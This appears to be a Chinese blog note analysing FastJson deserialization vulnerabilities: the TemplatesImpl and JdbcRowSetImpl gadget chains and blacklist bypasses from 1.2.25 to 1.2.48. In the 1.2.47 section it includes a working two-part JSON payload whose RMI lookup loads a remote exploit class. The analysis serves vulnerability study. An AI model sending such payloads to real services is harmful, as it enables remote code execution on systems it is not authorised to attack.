---
title: FastJson系列反序列化漏洞分析
date: 2022-2-23
tags:
 - Vulnerabilities
 - 笔记
categories:
 - Vulnerabilities
---

### 原理

* FastJson序列化对象为字符串使用toJSONString方法，反序列化还原对象使用：parseObject(String text)、parse(String text)、parseObject(String text, Class clazz)。其中，parseObject返回JSONObject，而parse返回的是实际类型的对象。当在没有对应类定义的情况下，会使用JSON.parseObject来获取数据。

* 而在反序列化的过程里，会自动调用反序列化对象中的getter、setter方法以及构造函数，这就是FastJson反序列化漏洞产生的原因。
* 反序列化的过程分成2步，首先是loadClass，在这个过程中会经过黑白名单检查，看这个类是否可以被反序列化。然后再进行deserialize。这个过程会不断的parse，去调用get or set方法，这个过程就可能出现恶意执行

### FastJson-1.2.22

两条调用链：

* JdbcRowSetImpl利用链
* TemplatesImpl利用链

这里主要说templateImpl，后文会提到jdbcRowSetImpl

恶意payload：

![image-20220414172531755](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220421222748.png)

type是要被反序列的类的类型。这个payload关键有两点，一个是bytecodes，另一个是outputProperties。

bytecodes就是包含恶意代码的恶意类，然后对他进行base64编码，生成字节码数组得到的。

![image-20220414172859344](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103753.png)

因为恶意代码已经被插入到了Template类前面，那么在对这个类进行实例化的时候，就会先执行恶意代码段，也就导致了漏洞。

具体执行的过程就是deserialize的过程，会不断的parse，一直到调用ouputProperties的get方法

![image-20220414190617752](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103813.png)

这个过程会调用defineTransletClasses()，里面会把bytecodes给class，相当于class就是bytecodes，然后newInstance。此时也就触发了前面插入的恶意代码段

### fastJson1.2.25-1.2.41，加黑名单，利用L绕过

### fastJson1.2.42 去除L判断黑名单，利用LL继续绕过

### fastJson1.2.44 L黑名单直接关闭

### fastJson 1.2.47 用Class控制缓存

因为在判断黑名单部分的逻辑是：首先看该类是否在缓存中，如果在，直接取。如果不在，那么进行黑名单判断。这也就存在漏洞，如果预先把类加到了缓存中，接下来判断的时候，就可以直接从缓存中取，不会进行黑名单判断。

因此，这里借助class，将jdbcRowSet加到缓存中，来绕过。

payload由两部分组成，首先是：

```json
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
```

这里会将com.sun.rowset.JdbcRowSetImpl加到缓存

第二部分就和之前一样：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}
```

在反序列化的时候，会调用setDataSourceName和setAutoCommit，在调用setAutoCommit的时候会调用connect方法，connect方法中会调用lookup

![image-20220414174333822](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103825.png)

![image-20220414174341103](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103844.png)

![image-20220414174350048](https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103855.png)

### fastJson1.2.48 在loadClass时，将缓存开关设置为false，Class加入黑名单